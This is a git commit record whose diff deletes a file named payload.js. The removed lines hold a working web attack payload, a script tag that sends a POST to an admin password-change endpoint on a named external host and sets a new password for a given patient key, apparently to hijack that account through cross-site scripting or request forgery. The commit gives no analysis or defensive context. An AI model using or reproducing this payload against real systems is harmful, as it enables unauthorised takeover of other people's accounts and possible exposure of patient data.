0a03d4e64170384e7aa375292c1be8dcfc1f0e59
tomoncrss <tonymyson89823@gmail.com>
2025-02-11 11:59:37 +0330

    Delete payload.js

--- payload.js
+++
@@ -1,6 +0,0 @@
-<script>fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: "&aPatientKey=199234" +
-                "&NewPassword=Test%40123%4012"
-        });</script>
